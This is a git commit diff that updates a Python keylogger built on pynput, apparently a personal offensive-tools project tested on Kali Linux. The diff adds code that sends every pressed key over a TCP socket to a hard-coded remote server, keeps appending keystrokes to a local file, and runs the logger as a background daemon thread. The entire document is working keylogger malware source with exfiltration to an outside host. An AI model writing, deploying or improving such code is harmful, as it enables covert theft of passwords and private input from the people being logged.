30b0c4b1d7ae1c9412b555e5fbc8c11a254291e0
Debangshu <114200360+Debang5hu@users.noreply.github.com>
2023-11-08 00:14:34 +0530

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,19 +1,25 @@
-#!/bin/bash/env python
+#!/usr/bin/python3
 
-#importing modules 
+# _*_ coding: utf-8 _*_
+#tested on linux (Linux kali 6.5.0-kali2-amd64)
+
+
 try:
-    import threading
+    import threading,socket
     from pynput import keyboard
 except:
     pass
 
+# <-- Intializing global values -->
+
+#replace the ip with your server's ip 
+SERVER_ADDRESS = '192.168.29.54:9090'.split(':')
+        
 #keystroke record
 class keylogger:
-
-    #tested on linux (Linux kali 6.5.0-kali2-amd64)
     def Keylogging(self):
         
-        def on_key_press(key):
+        def on_key_release(key):
             try:            
                 with open('keystrokes.txt','a+') as fh:
                     fh.write(f'{key.char}')
@@ -21,38 +27,41 @@ class keylogger:
                 with open('keystrokes.txt','a+') as fh:
                     key=str(key)
 
-                    #if spacebar is pressed just add a white space
                     if key == 'Key.space':
                         fh.write(' ')
 
-                    #if shift is pressed just pass the condition
-                    elif key == 'Key.shift': 
+                    elif key == 'Key.shift' or key == 'Key.shift_r': 
                         pass
                     
-                    #if ctrl is pressed,will get logged in as 'ctrl + {key}'
                     elif key == 'Key.ctrl': 
-                        fh.write(f'\nctrl + ')
+                        fh.write('\nctrl + ')
+
+                    elif key == 'Key.enter':
+                        fh.write('\n')
                     
                     else:
                         fh.write(f'\n{key}\n')
+        
+        def on_key_press(key):
+            server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            server.connect((SERVER_ADDRESS[0],int(SERVER_ADDRESS[-1])))
+            server.send(str(key).encode())
+            server.close()
 
         # Create listener objects
-        with keyboard.Listener(on_press=on_key_press) as listener:
+        with keyboard.Listener(on_press=on_key_press , on_release=on_key_release) as listener:
             listener.join()
 
 
-
 if __name__=='__main__':
-    #creating an object
-    obj=keylogger()
+    try:
+        #creating an object
+        obj=keylogger()
 
-    #implementing threading and daemon = True (to run it in background)
-    t1 = threading.Thread(target=obj.Keylogging,daemon = True)
+        #implementing threading and daemon = True (to run it in background)
+        t1 = threading.Thread(target=obj.Keylogging,daemon=True)
+        t1.start() 
+        t1.join()    
     
-    # start the threads
-    t1.start()
-    
-    # join the main thread
-    t1.join()
-    
-
+    except KeyboardInterrupt:
+        pass
